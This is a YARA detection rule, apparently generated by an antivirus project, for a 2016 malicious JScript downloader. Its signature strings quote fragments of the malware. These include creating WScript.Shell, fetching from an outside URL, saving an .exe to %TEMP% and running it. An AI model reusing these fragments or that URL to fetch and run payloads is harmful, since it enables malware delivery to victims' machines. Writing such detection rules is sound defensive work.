rule sig_20160329_ad634356d7656af403abe852ee8a695e {
  meta:
    description = "datamaliciousorder - file 20160329_ad634356d7656af403abe852ee8a695e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d6840bf6b528aabcb51f1c8312304a6f05978b4552ea6b8ce47b141a195d1b88"

  strings:
    $s1  = "for (;;){WScript[SX](E() * 11); if (iN[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s2  = "var b = function Mn() {return WScript[Jg](\"WScript.Shell\");}(), ed = 11;" fullword ascii
    $s3  = "function v(Ed, I0){aA = aA * 1; return Ed - I0;};" fullword ascii
    $s4  = "iN[V](\"GET\", \"http://pasticceriabonci.it/m1psa\", false);" fullword ascii
    $s5  = "function e() {return b[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"eOEbNRca1Z0.exe\";};" fullword ascii
    $s6  = "function Ge(){return \"\" + O;};" fullword ascii
    $s7  = "function R() {return ((q == true) && (q == i)) ? 1 : aA;};" fullword ascii
    $s8  = "function qD(vM){b[\"Run\"](vM, aA, aA);};" fullword ascii
    $s9  = "function w()" fullword ascii
    $s10 = "function E(){return 22;};" fullword ascii
    $s11 = "return v(c, Wk);" fullword ascii
    $s12 = "function Qa(FO) {var dG = (1, 2, 3, 4, 5, FO); return dG;};" fullword ascii
    $s13 = "function K(){return Jg;};" fullword ascii
    $s14 = " while (uS){" fullword ascii
    $s15 = "var K0 = new this[\"Date\"]();" fullword ascii
    $s16 = "var q = false;" fullword ascii
    $s17 = "q = true; " fullword ascii
    $s18 = "var i = false;" fullword ascii
    $s19 = "i = true; " fullword ascii
    $s20 = "var c0 = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}